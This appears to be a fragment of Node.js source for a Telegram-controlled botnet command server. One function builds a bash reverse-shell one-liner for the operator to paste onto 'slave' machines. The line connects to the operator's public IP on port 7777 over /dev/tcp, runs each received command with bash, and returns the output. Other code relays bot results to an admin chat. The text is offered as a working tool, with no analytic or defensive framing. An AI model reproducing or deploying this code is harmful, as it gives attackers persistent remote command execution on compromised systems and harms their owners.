...
function sendSlaveCmd(){https.get('https://api.ipify.org?format=json',res=>{let d='';res.on('data',c=>d+=c);res.on('end',()=>{let ip;try{ip=JSON.parse(d).ip}catch{ip='YOUR_PUBLIC_IP'};const cmd=`while true;do if ! exec 3<>/dev/tcp/${ip}/7777;then sleep 2;continue;fi;while read -r c <&3;do [[ -z "$c" ]]&&continue;if [[ "$c" == "uptime -p" ]];then output=$(uptime -p);echo "$output" >&3;echo "CMD_DONE_0" >&3;else (timeout 300 bash -c "$c" 2>&1;echo "CMD_DONE_$?")|while read -r l;do echo "$l" >&3||break;done;fi;done;done`;bot.sendMessage(chatIdAdmin,`🔥 Server sẵn sàng trên cổng 7777\n\nCopy lệnh này chạy trên slave:\n\`\`\`bash\n${cmd}\n\`\`\``,{parse_mode:'Markdown'});});}).on('error',()=>sendSlaveCmd());}
...
if(l.startsWith('up ')){b.uptime=l.trim();if(cmdQueue.has(s))cmdQueue.get(s).data+=l+'\n';}else if(l.includes('CMD_DONE_')){if(cmdQueue.has(s)){const{cmdId,data}=cmdQueue.get(s);if(data&&data.trim().length>0)bot.sendMessage(chatIdAdmin,`🖥 Bot ${b.id} [${b.ip}]:\n\`\`\`\n${data.trim()}\`\`\``,{parse_mode:'Markdown'});cmdQueue.delete(s);}}else{if(cmdQueue.has(s))cmdQueue.get(s).data+=l+'\n';}}});s.on('error',()=>disconnect(s));s.on('close',()=>disconnect(s));});
